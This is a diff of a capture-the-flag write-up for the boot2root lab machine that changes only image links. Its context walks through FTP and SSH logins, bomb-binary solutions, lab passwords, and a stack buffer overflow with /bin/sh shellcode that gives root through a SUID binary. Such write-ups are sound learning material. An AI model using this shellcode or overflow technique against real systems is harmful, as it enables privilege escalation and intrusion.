@@ -132,11 +132,11 @@ No Luck. Let's try FTP next.
 ftp 192.168.100.18
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/2.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/2.png)
 
 Okay, We can log in to FTP now. What can We do next?
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/3.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/3.png)
 
 Let's check what is stored in these files.
 
@@ -155,7 +155,7 @@ Complete this little challenge and use the result as password for user 'laurie' 
 
 #### SSH with laurie
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/4.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/4.png)
 
 Let's see what's in `fun`
 
@@ -163,7 +163,7 @@ Let's see what's in `fun`
 tar xf fun
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/5.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/5.png)
 
 Keep in mind that our goal now is to log in via SSH using `laurie's` credentials.
 
@@ -183,7 +183,7 @@ However, something unusual is appearing.
 //file88
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/6.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/6.png)
 
 Perhaps we should reconstruct the C file.
 
@@ -252,31 +252,31 @@ so let's try to login via ssh
 ```sh
 ssh laurie@192.168.100.18
 ```
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/7.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/8.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/7.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/8.png)
 
 #### Exploiting laurie's binary: 'bomb'
 
 Oh, there's some reverse engineering involved, which I love! We're going to transfer the `bomb` to my
 machine so We can use some tools to analyze it.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/9.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/9.png)
 
 Now, let's examine the `bomb` binary. BTW We used `ghidra`
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/11.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/10.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/12.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/13.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/11.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/10.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/12.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/13.png)
 
 ##### Phase 1
 Let's take a look at `phase_1`
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/14.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/14.png)
 
 As you can see, the first phase is straightforward.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/15.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/15.png)
 
 ```
 answer: Public speaking is very easy.
@@ -344,7 +344,7 @@ Therefore, we should input.
 answer: 1 2 6 24 120 720
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/16.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/16.png)
 
 
 ##### Phase 3
@@ -438,7 +438,7 @@ explode_bomb();
 
 To avoid triggering `explode_bomb`, set local_10 to 0, local_8 to 0x309 (which is 777), and local_9 to 'q'.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/17.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/17.png)
 
 ```
 answer: 0 q 777
@@ -484,8 +484,8 @@ We only need to input one number, which should be greater than or equal to 1. Th
 passed to `func4(num)`, which sould return 0x37=55. As you can see, `func4` is essentially a Fibonacci
 sequence. Through some experimentation, We discoverd this.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/18.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/19.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/18.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/19.png)
 
 ```
 answer: 9
@@ -522,7 +522,7 @@ The length should be 6, and we need `local_c` to be "giants".
 
 Alright, Let's go!
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/20.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/20.png)
 
 the operation `(iVar1 + param_1) & 0xf` will give index that will be used in the string
 `Arr = "isrveawhobpnutfg"`, and we control *param_1* we need the first character param_1[0]
@@ -540,7 +540,7 @@ and we can repeat this trick.
 answer: opekmq
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/21.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/21.png)
 
 ##### Last Phase
 
@@ -611,44 +611,44 @@ void phase_6(undefined4 param_1)
 
 - To exit the first do-while loop, all numbers should be less than or equal to 6, and they must be unique.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/22.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/22.png)
 
 It was a bit challenging at first because `ghidra` presented some undefined objects `node1`, However,
 we managed to find more information.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/23.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/23.png)
 
 So, I’m going to use only GDB for now.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/24.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/25.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/24.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/25.png)
 
 It appears to be some kind of linked list.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/unique_and_small_or_equal_6.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/unique_and_small_or_equal_6.png)
 
 As you can see, the numbers should not exceed 6 and must be unique, which aligns with the conclusion
 we reached in `ghidra`.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/fill_internal_array_with_pointers_to_nodes.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/fill_internal_array_with_pointers_to_nodes.png)
 
 Fill the internal array of pointers to nodes based on the values we pass. For example,
 if we pass 5, 4, ..., the pointer to node 5 will be at index[0], and so on.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/fill_internal_array_with_pointers_to_nodes_first_two.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/fill_internal_array_with_pointers_to_nodes_first_two.png)
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/link_nodes_stored_in_array.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/link_nodes_stored_in_array.png)
 
 Now, the linked list is updating its next pointers to point to the subsequent nodes according to the previous array.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/compate_nodes.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/compate_nodes.png)
 
 As you can see, if `node->value >= node->next->value`, we will skip the jump, thereby avoiding `explode_bomb`,
 which is our goal. We need some numbers that will arrange the nodes in the array according to this
 condition specifically in descending order. But what are the values of these nodes in the first place?
 Can we control them? Let’s inspect them first.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/node_values.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/node_values.png)
 
 As you can see We need node4, node2, node6, node3, node1 and node5.
 
@@ -677,7 +677,7 @@ However, We still couldn't log in with `thor`
 
 `https://stackoverflowteams.com/c/42network/questions/664?newreg=b3c414344ce94787a8e40aa3877c1ab8`
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/thor_access_why_switch.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/thor_access_why_switch.png)
 
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
@@ -690,16 +690,16 @@ ssh thor@192.168.100.18
 password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/thor_access.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/thor_access.png)
 
 ### thor access
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/turtle.gif)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/turtle.gif)
 
 Since We're somewhat familiar with Manim, I used it to generate the output, which is `SLASH`. Is this
 the password?
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/25.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/25.png)
 
 It's not working, and at the end of the turtle file, there’s the message: `Can you digest the message? :)`
 
@@ -718,9 +718,9 @@ echo -n SLASH | md5sum
 646da671ca01bb5d84dbb5fb2238dc8e
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/26.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/26.png)
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/later/)
 
 
 #### zaz SSH
@@ -731,7 +731,7 @@ password: 646da671ca01bb5d84dbb5fb2238dc8e
 
 Finally, we need to complete the last step.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/27.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/27.png)
 
 Oh, more exploits, but this will be the last one. The file `exploit_me` has the `SUID` flag,
 so if we gain a shell through it, we would be root.
@@ -784,7 +784,7 @@ ltrace ./exploit_me aaaaa bfffff
          U strcpy@@GLIBC_2.0
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/28.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/28.png)
 
 As you can see, just from these basic commands, We believe we can get a shell running,
 especially because we are using strcpy, which has no checks. By the way, our input is being copied
@@ -792,8 +792,8 @@ into `0xbffff640`!!. For now, let's keep in mind that we need to overflow this v
 to it and starts executing. First, let’s check if ASLR is enabled. The command `cat /proc/sys/kernel/randomize_va_space`
 returned 0, meaning ASLR is disabled, so we are on the right track.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/29.png)
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/30.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/29.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/30.png)
 
 As you can see, there’s a gap of 136 bytes between our input and the point where we will start overriding.
 If you notice different addresses, We believe that’s just due to the environment variables that GDB adds,
@@ -805,7 +805,7 @@ So let's input
 gdb --args ./exploit_me $(python -c "print 136*'a' + 'ebpE' + 'adrs'")
 ```
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/31.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/31.png)
 
 ```sh
 \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
@@ -823,14 +823,14 @@ It's not working, but it is functioning in GDB, which is strange. This is often 
 can influence some aspects of the stack. To investigate further, We used `ltrace` to check it
 and adjust the address accordingly.
 
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/32.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/32.png)
 
 ```sh
 ./exploit_me $(python -c  'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + 115*"a" + 4*"b" + "\x50\xf6\xff\xbf")' )
 ```
 
 ### DONE
-![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/33.png)
+![](https://raw.githubusercontent.com/Gharbaoui/pictures/refs/heads/master/boot2root/write2pics/33.png)
 
 #### Steps
 #### Common With Writeup1
